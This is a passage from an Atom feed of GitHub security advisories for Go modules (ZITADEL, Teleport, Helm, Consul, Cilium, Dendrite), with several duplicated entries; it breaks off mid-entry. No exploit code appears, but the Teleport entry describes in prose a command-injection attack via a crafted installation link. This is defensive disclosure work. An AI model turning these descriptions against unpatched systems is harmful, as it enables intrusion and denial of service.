<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2022-08-30T22:01:27.733Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/zitadel/zitadel] Broken Authorization in ZITADEL Actions]]></title>
        <id>https://github.com/advisories/GHSA-c8fj-4pm8-mp2c</id>
        <link href="https://github.com/advisories/GHSA-c8fj-4pm8-mp2c"/>
        <updated>2022-08-30T20:54:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><strong>Actions</strong>, introduced in ZITADEL <strong>1.42.0</strong> on the API and <strong>1.56.0</strong> for Console, is a feature, where users with role <code>ORG_OWNER</code> are able to create Javascript Code, which is invoked by the system at certain points during the login.
<strong>Actions</strong>, for example, allow creating authorizations (user grants) on newly created users programmatically.
Due to a missing authorization check, <strong>Actions</strong> were able to grant authorizations for projects that belong to other organisations inside the same Instance. Granting authorizations via API and Console is not affected by this vulnerability.</p>
<h3 id="patches">Patches</h3>
<p>2.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.2.0">2.2.0</a>
1.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v1.87.1">1.87.1</a></p>
<p>ZITADEL recommends upgrading to the latest versions available in due course.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround since a patch is already available.</p>
<h3 id="who-did-disclose-this">Who did disclose this</h3>
<p>During our recurring white box penetration test our external security consultant found this issue.
The full report will be made public after the complete review.</p>
<h3 id="references">References</h3>
<p><a href="https://docs.zitadel.com/docs/guides/manage/customize/behavior">https://docs.zitadel.com/docs/guides/manage/customize/behavior</a>
<a href="https://docs.zitadel.com/docs/apis/actions">https://docs.zitadel.com/docs/apis/actions</a>
<a href="https://zitadel.com/blog/pentest-results-h1-2021">https://zitadel.com/blog/pentest-results-h1-2021</a></p>
<h3 id="questions">Questions</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-c8fj-4pm8-mp2c">https://github.com/zitadel/zitadel/security/advisories/GHSA-c8fj-4pm8-mp2c</a></li>
<li><a href="https://github.com/zitadel/zitadel/pull/4237">https://github.com/zitadel/zitadel/pull/4237</a></li>
<li><a href="https://github.com/zitadel/zitadel/pull/4238">https://github.com/zitadel/zitadel/pull/4238</a></li>
<li><a href="https://github.com/advisories/GHSA-c8fj-4pm8-mp2c">https://github.com/advisories/GHSA-c8fj-4pm8-mp2c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c8fj-4pm8-mp2c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-08-30T20:54:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/zitadel/zitadel] Broken Authorization in ZITADEL Actions]]></title>
        <id>https://github.com/advisories/GHSA-c8fj-4pm8-mp2c</id>
        <link href="https://github.com/advisories/GHSA-c8fj-4pm8-mp2c"/>
        <updated>2022-08-30T20:54:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><strong>Actions</strong>, introduced in ZITADEL <strong>1.42.0</strong> on the API and <strong>1.56.0</strong> for Console, is a feature, where users with role <code>ORG_OWNER</code> are able to create Javascript Code, which is invoked by the system at certain points during the login.
<strong>Actions</strong>, for example, allow creating authorizations (user grants) on newly created users programmatically.
Due to a missing authorization check, <strong>Actions</strong> were able to grant authorizations for projects that belong to other organisations inside the same Instance. Granting authorizations via API and Console is not affected by this vulnerability.</p>
<h3 id="patches">Patches</h3>
<p>2.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.2.0">2.2.0</a>
1.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v1.87.1">1.87.1</a></p>
<p>ZITADEL recommends upgrading to the latest versions available in due course.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround since a patch is already available.</p>
<h3 id="who-did-disclose-this">Who did disclose this</h3>
<p>During our recurring white box penetration test our external security consultant found this issue.
The full report will be made public after the complete review.</p>
<h3 id="references">References</h3>
<p><a href="https://docs.zitadel.com/docs/guides/manage/customize/behavior">https://docs.zitadel.com/docs/guides/manage/customize/behavior</a>
<a href="https://docs.zitadel.com/docs/apis/actions">https://docs.zitadel.com/docs/apis/actions</a>
<a href="https://zitadel.com/blog/pentest-results-h1-2021">https://zitadel.com/blog/pentest-results-h1-2021</a></p>
<h3 id="questions">Questions</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-c8fj-4pm8-mp2c">https://github.com/zitadel/zitadel/security/advisories/GHSA-c8fj-4pm8-mp2c</a></li>
<li><a href="https://github.com/zitadel/zitadel/pull/4237">https://github.com/zitadel/zitadel/pull/4237</a></li>
<li><a href="https://github.com/zitadel/zitadel/pull/4238">https://github.com/zitadel/zitadel/pull/4238</a></li>
<li><a href="https://github.com/advisories/GHSA-c8fj-4pm8-mp2c">https://github.com/advisories/GHSA-c8fj-4pm8-mp2c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c8fj-4pm8-mp2c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-08-30T20:54:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/gravitational/teleport] Improper token validation leading to code execution in Teleport]]></title>
        <id>https://github.com/advisories/GHSA-6xf3-5hp7-xqqg</id>
        <link href="https://github.com/advisories/GHSA-6xf3-5hp7-xqqg"/>
        <updated>2022-08-30T20:53:55.000Z</updated>
        <content type="html"><![CDATA[<p>Teleport 9.3.6 is vulnerable to Command injection leading to Remote Code Execution. An attacker can craft a malicious ssh agent installation link by URL encoding a bash escape with carriage return line feed. This url encoded payload can be used in place of a token and sent to a user in a social engineering attack. This is fully unauthenticated attack utilizing the trusted teleport server to deliver the payload.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-36633">https://nvd.nist.gov/vuln/detail/CVE-2022-36633</a></li>
<li><a href="https://packetstormsecurity.com/files/168137/Teleport-9.3.6-Command-Injection.html">https://packetstormsecurity.com/files/168137/Teleport-9.3.6-Command-Injection.html</a></li>
<li><a href="https://github.com/gravitational/teleport/pull/14726">https://github.com/gravitational/teleport/pull/14726</a></li>
<li><a href="https://github.com/gravitational/teleport/pull/14726/commits/46c23b9b64b944d1e82d2c8a79083f291ffdd3b6">https://github.com/gravitational/teleport/pull/14726/commits/46c23b9b64b944d1e82d2c8a79083f291ffdd3b6</a></li>
<li><a href="https://github.com/gravitational/teleport/releases/tag/v10.1.2">https://github.com/gravitational/teleport/releases/tag/v10.1.2</a></li>
<li><a href="https://github.com/gravitational/teleport/releases/tag/v8.3.17">https://github.com/gravitational/teleport/releases/tag/v8.3.17</a></li>
<li><a href="https://github.com/gravitational/teleport/releases/tag/v9.3.13">https://github.com/gravitational/teleport/releases/tag/v9.3.13</a></li>
<li><a href="https://github.com/advisories/GHSA-6xf3-5hp7-xqqg">https://github.com/advisories/GHSA-6xf3-5hp7-xqqg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6xf3-5hp7-xqqg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-08-25T00:00:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/gravitational/teleport] Improper token validation leading to code execution in Teleport]]></title>
        <id>https://github.com/advisories/GHSA-6xf3-5hp7-xqqg</id>
        <link href="https://github.com/advisories/GHSA-6xf3-5hp7-xqqg"/>
        <updated>2022-08-30T20:53:55.000Z</updated>
        <content type="html"><![CDATA[<p>Teleport 9.3.6 is vulnerable to Command injection leading to Remote Code Execution. An attacker can craft a malicious ssh agent installation link by URL encoding a bash escape with carriage return line feed. This url encoded payload can be used in place of a token and sent to a user in a social engineering attack. This is fully unauthenticated attack utilizing the trusted teleport server to deliver the payload.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-36633">https://nvd.nist.gov/vuln/detail/CVE-2022-36633</a></li>
<li><a href="https://packetstormsecurity.com/files/168137/Teleport-9.3.6-Command-Injection.html">https://packetstormsecurity.com/files/168137/Teleport-9.3.6-Command-Injection.html</a></li>
<li><a href="https://github.com/gravitational/teleport/pull/14726">https://github.com/gravitational/teleport/pull/14726</a></li>
<li><a href="https://github.com/gravitational/teleport/pull/14726/commits/46c23b9b64b944d1e82d2c8a79083f291ffdd3b6">https://github.com/gravitational/teleport/pull/14726/commits/46c23b9b64b944d1e82d2c8a79083f291ffdd3b6</a></li>
<li><a href="https://github.com/gravitational/teleport/releases/tag/v10.1.2">https://github.com/gravitational/teleport/releases/tag/v10.1.2</a></li>
<li><a href="https://github.com/gravitational/teleport/releases/tag/v8.3.17">https://github.com/gravitational/teleport/releases/tag/v8.3.17</a></li>
<li><a href="https://github.com/gravitational/teleport/releases/tag/v9.3.13">https://github.com/gravitational/teleport/releases/tag/v9.3.13</a></li>
<li><a href="https://github.com/advisories/GHSA-6xf3-5hp7-xqqg">https://github.com/advisories/GHSA-6xf3-5hp7-xqqg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6xf3-5hp7-xqqg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-08-25T00:00:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/gravitational/teleport] Improper token validation leading to code execution in Teleport]]></title>
        <id>https://github.com/advisories/GHSA-6xf3-5hp7-xqqg</id>
        <link href="https://github.com/advisories/GHSA-6xf3-5hp7-xqqg"/>
        <updated>2022-08-30T20:53:55.000Z</updated>
        <content type="html"><![CDATA[<p>Teleport 9.3.6 is vulnerable to Command injection leading to Remote Code Execution. An attacker can craft a malicious ssh agent installation link by URL encoding a bash escape with carriage return line feed. This url encoded payload can be used in place of a token and sent to a user in a social engineering attack. This is fully unauthenticated attack utilizing the trusted teleport server to deliver the payload.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-36633">https://nvd.nist.gov/vuln/detail/CVE-2022-36633</a></li>
<li><a href="https://packetstormsecurity.com/files/168137/Teleport-9.3.6-Command-Injection.html">https://packetstormsecurity.com/files/168137/Teleport-9.3.6-Command-Injection.html</a></li>
<li><a href="https://github.com/gravitational/teleport/pull/14726">https://github.com/gravitational/teleport/pull/14726</a></li>
<li><a href="https://github.com/gravitational/teleport/pull/14726/commits/46c23b9b64b944d1e82d2c8a79083f291ffdd3b6">https://github.com/gravitational/teleport/pull/14726/commits/46c23b9b64b944d1e82d2c8a79083f291ffdd3b6</a></li>
<li><a href="https://github.com/gravitational/teleport/releases/tag/v10.1.2">https://github.com/gravitational/teleport/releases/tag/v10.1.2</a></li>
<li><a href="https://github.com/gravitational/teleport/releases/tag/v8.3.17">https://github.com/gravitational/teleport/releases/tag/v8.3.17</a></li>
<li><a href="https://github.com/gravitational/teleport/releases/tag/v9.3.13">https://github.com/gravitational/teleport/releases/tag/v9.3.13</a></li>
<li><a href="https://github.com/advisories/GHSA-6xf3-5hp7-xqqg">https://github.com/advisories/GHSA-6xf3-5hp7-xqqg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6xf3-5hp7-xqqg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-08-25T00:00:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[helm.sh/helm/v3] Denial of service through string value parsing]]></title>
        <id>https://github.com/advisories/GHSA-7hfp-qfw3-5jxh</id>
        <link href="https://github.com/advisories/GHSA-7hfp-qfw3-5jxh"/>
        <updated>2022-08-30T20:52:34.000Z</updated>
        <content type="html"><![CDATA[<p>Fuzz testing, by Ada Logics and sponsored by the CNCF, identified input to functions in the <em>strvals</em> package that can cause an out of memory panic. Out of memory panics cannot be recovered from. Applications that use functions from the <em>strvals</em> package in the Helm SDK can have a Denial of Service attack when they use this package and it panics.</p>
<h3 id="impact">Impact</h3>
<p>The <em>strvals</em> package contains a parser that turns strings into Go structures. For example, the Helm client has command line flags like <code>--set</code>, <code>--set-string</code>, and others that enable the user to pass in strings that are merged into the values. The <em>strvals</em> package converts these strings into structures Go can work with. Some string inputs can cause array data structures to be created causing an out of memory panic.</p>
<p>Applications that use the <em>strvals</em> package in the Helm SDK to parse user supplied input can suffer a Denial of Service when that input causes a panic that cannot be recovered from.</p>
<p>The Helm Client will panic with input to <code>--set</code>, <code>--set-string</code>, and other value setting flags that causes an out of memory panic. Helm is not a long running service so the panic will not affect future uses of the Helm client.</p>
<h3 id="patches">Patches</h3>
<p>This issue has been resolved in 3.9.4. </p>
<h3 id="workarounds">Workarounds</h3>
<p>SDK users can validate strings supplied by users won't create large arrays causing significant memory usage before passing them to the <em>strvals</em> functions.</p>
<h3 id="for-more-information">For more information</h3>
<p>Helm's security policy is spelled out in detail in our <a href="https://github.com/helm/community/blob/master/SECURITY.md">SECURITY</a> document.</p>
<h3 id="credits">Credits</h3>
<p>Disclosed by Ada Logics in a fuzzing audit sponsored by CNCF.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/helm/helm/security/advisories/GHSA-7hfp-qfw3-5jxh">https://github.com/helm/helm/security/advisories/GHSA-7hfp-qfw3-5jxh</a></li>
<li><a href="https://github.com/advisories/GHSA-7hfp-qfw3-5jxh">https://github.com/advisories/GHSA-7hfp-qfw3-5jxh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7hfp-qfw3-5jxh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-08-30T20:52:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/consul] HashiCorp Consul Template could reveal Vault secret contents in error messages]]></title>
        <id>https://github.com/advisories/GHSA-8449-7gc2-pwrp</id>
        <link href="https://github.com/advisories/GHSA-8449-7gc2-pwrp"/>
        <updated>2022-08-30T20:17:03.000Z</updated>
        <content type="html"><![CDATA[<p>In HashiCorp Consul Template through 0.29.1, invalid templates could inadvertently reveal the contents of Vault secret in errors returned by the <code>*template.Template.Execute 5</code> method, when given a template using Vault secret contents incorrectly. This method has been updated to redact Vault secrets when creating an error string, making it safe to log the error.. This issue was fixed in version 0.29.2.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-38149">https://nvd.nist.gov/vuln/detail/CVE-2022-38149</a></li>
<li><a href="https://discuss.hashicorp.com">https://discuss.hashicorp.com</a></li>
<li><a href="https://discuss.hashicorp.com/t/hsec-2022-16-consul-template-may-expose-vault-secrets-when-processing-invalid-input/43215">https://discuss.hashicorp.com/t/hsec-2022-16-consul-template-may-expose-vault-secrets-when-processing-invalid-input/43215</a></li>
<li><a href="https://github.com/advisories/GHSA-8449-7gc2-pwrp">https://github.com/advisories/GHSA-8449-7gc2-pwrp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8449-7gc2-pwrp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-08-18T00:00:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Network Policies & (Clusterwide) Cilium Network Policies with namespace label selectors may unexpectedly select pods with maliciously crafted labels]]></title>
        <id>https://github.com/advisories/GHSA-pfhr-pccp-hwmh</id>
        <link href="https://github.com/advisories/GHSA-pfhr-pccp-hwmh"/>
        <updated>2022-08-30T20:06:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If a user has Network Policies with namespace selectors selecting labels of namespaces, or (clusterwide) Cilium Network Policies matching on namespace labels, then it is possible for an attacker with Kubernetes pod deploy rights (either directly or indirectly via higher-level APIs such as Deployment, Daemonset etc) to craft additional pod labels such that the pod is selected by another policy that exists rather than the expected policy. </p>
<h3 id="patches">Patches</h3>
<p>The problem has been fixed and is available on versions &gt;=1.10.14, &gt;=1.11.8, &gt;=1.12.1</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no workarounds available.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to Sander Mathijssen for not only highlighting the issue but also proposing a resolution. </p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>As usual, if you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list: <a href="mailto:security@cilium.io">security@cilium.io</a> - first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-pfhr-pccp-hwmh">https://github.com/cilium/cilium/security/advisories/GHSA-pfhr-pccp-hwmh</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.10.14">https://github.com/cilium/cilium/releases/tag/v1.10.14</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.11.8">https://github.com/cilium/cilium/releases/tag/v1.11.8</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.12.1">https://github.com/cilium/cilium/releases/tag/v1.12.1</a></li>
<li><a href="https://github.com/advisories/GHSA-pfhr-pccp-hwmh">https://github.com/advisories/GHSA-pfhr-pccp-hwmh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pfhr-pccp-hwmh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-08-30T20:06:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Network Policies & (Clusterwide) Cilium Network Policies with namespace label selectors may unexpectedly select pods with maliciously crafted labels]]></title>
        <id>https://github.com/advisories/GHSA-pfhr-pccp-hwmh</id>
        <link href="https://github.com/advisories/GHSA-pfhr-pccp-hwmh"/>
        <updated>2022-08-30T20:06:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If a user has Network Policies with namespace selectors selecting labels of namespaces, or (clusterwide) Cilium Network Policies matching on namespace labels, then it is possible for an attacker with Kubernetes pod deploy rights (either directly or indirectly via higher-level APIs such as Deployment, Daemonset etc) to craft additional pod labels such that the pod is selected by another policy that exists rather than the expected policy. </p>
<h3 id="patches">Patches</h3>
<p>The problem has been fixed and is available on versions &gt;=1.10.14, &gt;=1.11.8, &gt;=1.12.1</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no workarounds available.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to Sander Mathijssen for not only highlighting the issue but also proposing a resolution. </p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>As usual, if you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list: <a href="mailto:security@cilium.io">security@cilium.io</a> - first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-pfhr-pccp-hwmh">https://github.com/cilium/cilium/security/advisories/GHSA-pfhr-pccp-hwmh</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.10.14">https://github.com/cilium/cilium/releases/tag/v1.10.14</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.11.8">https://github.com/cilium/cilium/releases/tag/v1.11.8</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.12.1">https://github.com/cilium/cilium/releases/tag/v1.12.1</a></li>
<li><a href="https://github.com/advisories/GHSA-pfhr-pccp-hwmh">https://github.com/advisories/GHSA-pfhr-pccp-hwmh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pfhr-pccp-hwmh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-08-30T20:06:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Network Policies & (Clusterwide) Cilium Network Policies with namespace label selectors may unexpectedly select pods with maliciously crafted labels]]></title>
        <id>https://github.com/advisories/GHSA-pfhr-pccp-hwmh</id>
        <link href="https://github.com/advisories/GHSA-pfhr-pccp-hwmh"/>
        <updated>2022-08-30T20:06:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If a user has Network Policies with namespace selectors selecting labels of namespaces, or (clusterwide) Cilium Network Policies matching on namespace labels, then it is possible for an attacker with Kubernetes pod deploy rights (either directly or indirectly via higher-level APIs such as Deployment, Daemonset etc) to craft additional pod labels such that the pod is selected by another policy that exists rather than the expected policy. </p>
<h3 id="patches">Patches</h3>
<p>The problem has been fixed and is available on versions &gt;=1.10.14, &gt;=1.11.8, &gt;=1.12.1</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no workarounds available.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Isovalent to prepare these mitigations. Special thanks to Sander Mathijssen for not only highlighting the issue but also proposing a resolution. </p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>As usual, if you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list: <a href="mailto:security@cilium.io">security@cilium.io</a> - first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-pfhr-pccp-hwmh">https://github.com/cilium/cilium/security/advisories/GHSA-pfhr-pccp-hwmh</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.10.14">https://github.com/cilium/cilium/releases/tag/v1.10.14</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.11.8">https://github.com/cilium/cilium/releases/tag/v1.11.8</a></li>
<li><a href="https://github.com/cilium/cilium/releases/tag/v1.12.1">https://github.com/cilium/cilium/releases/tag/v1.12.1</a></li>
<li><a href="https://github.com/advisories/GHSA-pfhr-pccp-hwmh">https://github.com/advisories/GHSA-pfhr-pccp-hwmh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pfhr-pccp-hwmh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-08-30T20:06:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/matrix-org/dendrite] gomatrixserverlib and Dendrite vulnerable to incorrect parsing of the event default power level in event auth]]></title>
        <id>https://github.com/advisories/GHSA-grvv-h2f9-7v9c</id>
        <link href="https://github.com/advisories/GHSA-grvv-h2f9-7v9c"/>
        <updated>2022-08-30T19:54:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The power level parsing within gomatrixserverlib was failing to parse the <code>"events_default"</code> key of the <code>m.room.power_levels</code> event, defaulting the event default power level to zero in all cases.</p>
<p>In rooms where the <code>"events_default"</code> power level had been changed, this could result in events either being incorrectly authorised or rejected by Dendrite servers.</p>
<h3 id="patches">Patches</h3>
<p>gomatrixserverlib contains a fix as of commit <code>723fd49</code> and Dendrite 0.9.3 has been updated accordingly.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Matrix rooms where the <code>"events_default"</code> power level has not been changed from the default of zero are not vulnerable.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, e-mail us at <a href="mailto:security@matrix.org">security@matrix.org</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/matrix-org/gomatrixserverlib/security/advisories/GHSA-grvv-h2f9-7v9c">https://github.com/matrix-org/gomatrixserverlib/security/advisories/GHSA-grvv-h2f9-7v9c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-36009">https://nvd.nist.gov/vuln/detail/CVE-2022-36009</a></li>
<li><a href="https://github.com/matrix-org/gomatrixserverlib/commit/723fd495dde835d078b9f2074b6b62c06dea4575">https://github.com/matrix-org/gomatrixserverlib/commit/723fd495dde835d078b9f2074b6b62c06dea4575</a></li>
<li><a href="https://matrix.org/docs/guides/moderation/#power-levels">https://matrix.org/docs/guides/moderation/#power-levels</a></li>
<li><a href="https://github.com/advisories/GHSA-grvv-h2f9-7v9c">https://github.com/advisories/GHSA-grvv-h2f9-7v9c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-grvv-h2f9-7v9c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-08-30T19:54:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/consul] HashiCorp Consul Ingress Gateway Panic Can Shutdown Servers]]></title>
        <id>https://github.com/advisories/GHSA-hj93-5fg3-3chr</id>
        <link href="https://github.com/advisories/GHSA-hj93-5fg3-3chr"/>
        <updated>2022-08-18T19:07:24.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Consul and Consul Enterprise 1.8.0 through 1.9.14, 1.10.7, and 1.11.2 has Uncontrolled Resource Consumption. Clusters with at least one ingress gateway configured may allow a user with <code>service:write</code> permission to register a specifically-defined service that can cause the Consul server to panic and shutdown. Versions 1.9.15, 1.10.8, and 1.11.3 contain patches for the problem.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-24687">https://nvd.nist.gov/vuln/detail/CVE-2022-24687</a></li>
<li><a href="https://discuss.hashicorp.com">https://discuss.hashicorp.com</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2022-05-consul-ingress-gateway-panic-can-shutdown-servers/">https://discuss.hashicorp.com/t/hcsec-2022-05-consul-ingress-gateway-panic-can-shutdown-servers/</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20220331-0006/">https://security.netapp.com/advisory/ntap-20220331-0006/</a></li>
<li><a href="https://security.gentoo.org/glsa/202208-09">https://security.gentoo.org/glsa/202208-09</a></li>
<li><a href="https://github.com/advisories/GHSA-hj93-5fg3-3chr">https://github.com/advisories/GHSA-hj93-5fg3-3chr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hj93-5fg3-3chr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-02-25T00:01:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/consul] HashiCorp Consul Ingress Gateway Panic Can Shutdown Servers]]></title>
        <id>https://github.com/advisories/GHSA-hj93-5fg3-3chr</id>
        <link href="https://github.com/advisories/GHSA-hj93-5fg3-3chr"/>
        <updated>2022-08-18T19:07:24.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Consul and Consul Enterprise 1.8.0 through 1.9.14, 1.10.7, and 1.11.2 has Uncontrolled Resource Consumption. Clusters with at least one ingress gateway configured may allow a user with <code>service:write</code> permission to register a specifically-defined service that can cause the Consul server to panic and shutdown. Versions 1.9.15, 1.10.8, and 1.11.3 contain patches for the problem.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-24687">https://nvd.nist.gov/vuln/detail/CVE-2022-24687</a></li>
<li><a href="https://discuss.hashicorp.com">https://discuss.hashicorp.com</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2022-05-consul-ingress-gateway-panic-can-shutdown-servers/">https://discuss.hashicorp.com/t/hcsec-2022-05-consul-ingress-gateway-panic-can-shutdown-servers/</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20220331-0006/">https://security.netapp.com/advisory/ntap-20220331-0006/</a></li>
<li><a href="https://security.gentoo.org/glsa/202208-09">https://security.gentoo.org/glsa/202208-09</a></li>
<li><a href="https://github.com/advisories/GHSA-hj93-5fg3-3chr">https://github.com/advisories/GHSA-hj93-5fg3-3chr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
